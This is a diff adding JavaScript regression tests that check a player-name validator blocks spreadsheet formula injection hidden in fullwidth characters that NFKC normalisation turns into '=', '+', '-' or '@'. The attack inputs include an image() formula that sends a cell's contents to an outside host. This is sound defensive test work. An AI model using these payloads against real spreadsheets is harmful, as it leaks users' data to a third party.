@@ -217,6 +217,61 @@ test('validateSubmission 對 null body 回傳失敗而不拋例外', () => {
   });
 });
 
+// --- validateSubmission：驗證的是 name，但寫進 Sheet 的 player_id 來自
+// normalizeName(name) 的 NFKC 正規化結果。全形／相容變體字元經 NFKC 後
+// 會變成 ASCII 的 =、+、-、@，因此必須連 player_id 一起檢查，
+// 否則像「﹦players!c2」這種 name 本身通得過檢查，NFKC 之後卻變成公式注入。
+// 這批測試刻意呼叫 validateSubmission 本身（而非分別單測 normalizeName／
+// 舊版正規表達式），因為漏洞正好出在兩者之間的介面上。
+test('validateSubmission 擋下 NFKC 正規化後才會變成公式開頭的全形／相容變體字元', () => {
+  const attacks = ['＝1', '﹦players!c2', '＋1', '－1', '＠1', '﹦image("//a.tw/"&b2)'];
+  attacks.forEach((bad) => {
+    const r = lib.validateSubmission({ name: bad, pin: '1234', bet: 1, nonce: 'n1' });
+    assert.strictEqual(r.ok, false, JSON.stringify(bad) + ' 應該被拒絕');
+    assert.strictEqual(r.reason, 'bad_name', JSON.stringify(bad) + ' 應該回傳 bad_name');
+  });
+});
+
+test('validateSubmission 通過的 playerId 一律不以 =+-@ 開頭，也不含控制字元', () => {
+  const goodNames = ['阿明', '陳小明', '  kevin  ', 'Ｋｅｖｉｎ', 'KEVIN', '大雄', '王大同'];
+  goodNames.forEach((name) => {
+    const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
+    assert.strictEqual(r.ok, true, JSON.stringify(name) + ' 應該通過');
+    assert.ok(!/^[=+\-@]/.test(r.playerId), JSON.stringify(name) + ' 的 playerId 不該以公式字元開頭：' + r.playerId);
+    assert.ok(!/[\x00-\x1F\x7F]/.test(r.playerId), JSON.stringify(name) + ' 的 playerId 不該含控制字元');
+  });
+});
+
+test('validateSubmission 一般名字（例如「阿明」）的 playerId 等於 normalizeName(name)', () => {
+  const r = lib.validateSubmission({ name: '阿明', pin: '1234', bet: 1, nonce: 'n1' });
+  assert.strictEqual(r.ok, true);
+  assert.ok('playerId' in r);
+  assert.strictEqual(r.playerId, lib.normalizeName('阿明'));
+});
+
+test('validateSubmission 拒絕正規化後變成空字串的名字', () => {
+  // U+FEFF（BOM／零寬不斷行空白）NFKC 後被 trim 掉，name 本身非空、不含控制字元、
+  // 不以 =+-@ 開頭，會通過既有檢查，但 playerId 會是空字串。
+  const r = lib.validateSubmission({ name: '﻿', pin: '1234', bet: 1, nonce: 'n1' });
+  assert.strictEqual(r.ok, false);
+  assert.strictEqual(r.reason, 'bad_name');
+});
+
+test('validateSubmission 剛好 20 個中文字的名字要能通過（上限不能誤傷真玩家）', () => {
+  const name = '陳'.repeat(20);
+  const r = lib.validateSubmission({ name, pin: '1234', bet: 1, nonce: 'n1' });
+  assert.strictEqual(r.ok, true);
+  assert.strictEqual(r.playerId, lib.normalizeName(name));
+});
+
+test('validateSubmission 超過 20 字的注入字串仍回報 bad_name（確認調換順序沒弄壞長度檢查）', () => {
+  const tooLong = '﹦image("//a.tw/"&b22)'; // 21 字，開頭是相容變體全形等號，非 ASCII 開頭
+  assert.strictEqual(tooLong.length, 21);
+  const r = lib.validateSubmission({ name: tooLong, pin: '1234', bet: 1, nonce: 'n1' });
+  assert.strictEqual(r.ok, false);
+  assert.strictEqual(r.reason, 'bad_name');
+});
+
 // --- 行情 API 回應解析 ---
 test('parseTickerPrice 取出價格並轉成 number（Coinbase Exchange）', () => {
   assert.strictEqual(
